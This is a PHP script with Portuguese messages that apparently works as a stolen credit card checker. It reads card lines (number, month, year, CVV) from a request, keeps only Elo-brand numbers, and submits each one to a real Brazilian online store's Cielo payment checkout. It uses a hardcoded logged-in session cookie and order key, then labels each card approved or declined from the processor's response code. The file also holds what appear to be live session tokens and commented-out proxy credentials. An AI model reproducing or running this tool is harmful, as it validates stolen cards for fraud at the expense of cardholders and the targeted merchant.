<?php
$start_time = microtime(true); 
sleep(5);
// exit('RETRY;Preparando teste');
set_time_limit(0);
extract($_REQUEST);

if (@$lista == ''){
	exit('Lista em branco');
}

list($cc, $mm, $yy, $cvv) = explode('|', $lista);

if (strlen($yy)==2){
	$yy = "20$yy";
}

if (strlen($mm)==1){
	$mm = "0$mm";
}

$ch = curl_init();

$proxy = '127.0.0.1:8888';
//$proxy_auth = 'brd-customer-hl_98932ec4-zone-data_center:y3mtdh39q9w9';

$url = "https://bymed.com.br/checkout/order-pay/190792/?pay_for_order=true&key=wc_order_kqkE7FmmqdOnB";

$post = 'cielo_webservice_boleto%5Bbandeira%5D=boleto&payment_method=loja5_woo_cielo_webservice&cielo_webservice%5Bbandeira%5D=visa&cielo_webservice%5Bhash%5D=3b7f9583726087dda0188c3c06e33c7520230222021053&cielo_webservice%5Btitular%5D=fhghtht+httht&cielo_webservice%5Bfiscal%5D=08601789ervice%5Bnumero%5D='.$cc.'&cielo_webservice%5Bvalidade_mes%5D='.$mm.'&cielo_webservice%5Bvalidade_ano%5D='.$yy.'&cielo_webservice%5Bcvv%5D='.$cvv.'&cielo_webservice%5Bparcela%5D=MXwxfDg1LjEwfGRtbHpZUT09fE9EVXVNVEE9fDc2MWZhNDVmMTU5ZDcyZmZlODU0Y2FkZmNjZDRmY2U0&woocommerce_pay=1&terms=on&terms-field=1&woocommerce-pay-nonce=ec2d6833e5&_wp_http_referer=%2Fcheckout%2Forder-pay%2F190792%2F%3Fpay_for_order%3Dtrue%26key%3Dwc_order_kqkE7FmmqdOnB';


	// VERIFICADOR DE BIN //

$re = array(
    "Mastercard" => "/^5\d{12}(\d{3})?$/",
    "Visa" => "/^4[0-9]{12}(?:[0-9]{3})?$/",
    "Elo" => "/^((((636368)|(438935)|(504175)|(650905)|(650518)|(451416)|(426807))\d{0,10})|((4268)|(4576)|(6550)|(6516)|(6504)||(6509)|(0001)|(000045)|(6505))\d{0,12})$/",
    "American Express" => "/^3[47]\d{13}$/",
    "jcb" => "/^(?:2131|1800|35\d{3})\d{11}$/",
    "aura" => "/^(5078\d{2})(\d{2})(\d{11})$/",
    "hipercard" => "/^(606282\d{10}(\d{3})?)|(3841\d{15})$/",
    "maestro" => "/^(?:5[0678]\d\d|6304|6390|67\d\d)\d{8,15}$/",
  );

   if (preg_match($re['Elo'], $cc)) {
     $tipo = "Elo";
  
  }
  
  else {
    echo "Reprovada $cc|$mm|$yy|$cvv Status: Bin Não Suportada </br>";
      die();
  }

			// VERIFICADOR DE BIN //





	curl_setopt_array($ch, array(
	CURLOPT_URL => $url,
	CURLOPT_SSL_VERIFYPEER => false,
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_FOLLOWLOCATION => true,
	CURLOPT_POST => true,
	CURLOPT_POSTFIELDS => $post,
	//CURLOPT_PROXY, $proxy,
    //CURLOPT_PROXYUSERPWD, $proxy_auth,
	CURLOPT_ENCODING => '',
	CURLOPT_HTTPHEADER => array(
	'Host: bymed.com.br',
	'Connection: keep-alive',
	'Cache-Control: max-age=0',
	'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
	'sec-ch-ua-mobile: ?0',
	'Origin: https://bymed.com.br',
	'Upgrade-Insecure-Requests: 1',
	'DNT: 1',
	'Content-Type: application/x-www-form-urlencoded',
	'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
	'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'Sec-Fetch-Site: same-origin',
	'Sec-Fetch-Mode: navigate',
	'Sec-Fetch-User: ?1',
	'Sec-Fetch-Dest: document',
	'Referer: https://bymed.com.br/checkout/order-pay/190792/?pay_for_order=true&key=wc_order_kqkE7FmmqdOnB',
	'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
	'Cookie: _ga=GA1.3.1117166428.1677031294; _gid=GA1.3.652228051.1677031294; tk_ai=woo%3AxqmZs2R9JPhZLFiqUO6vynQj; wordpress_logged_in_ffc900da3a4cd9e55668cca9b7da9628=vabaw24689%40jobsfeel.com%7C1677204611%7CV0l3wT0WFd8p6Nwly76fBwWA3gY6zb41ZHIdG3qh1Un%7Ca38d4c3166036db3d2e670536100f0cbd1f92a4947109c1070129091eceee9b3; wp_woocommerce_session_ffc900da3a4cd9e55668cca9b7da9628=18988%7C%7C1677204620%7C%7C1677201020%7C%7C0a3158ffc395361cea21914d62bd2209',


	)
));
$result = curl_exec($ch);
if (strpos($result, '<b>LR:</b> ')!==false){
	$result = explode('<b>LR:</b> ', $result)[1];
	$result = explode('<br />', $result)[0];
	list($code, $msg) = explode(' &#8211; ', $result);
	$end_time = microtime(true);
	$execution_time = intval($end_time - $start_time); 
	if ($code == '00'){
		exit('<h6><b>✔ Aprovada &#8211; '.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.' '.$bin.' ('.$execution_time.'s)</h6></b><br>');
	} elseif ($code == '82'){
		exit('<h6><b>✔ Aprovada &#8211; '.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.''.$bin.' </h6></b><br>');
	} else {
		exit($msg.'<h6><b>  &#8211; '.$code.' ('.$execution_time.'s)</h6></b><br>');
	}
} else {
	exit('<h6><b> Seu Teste Está Sendo Preparado, Aguarde!</h6></b><br>');
}
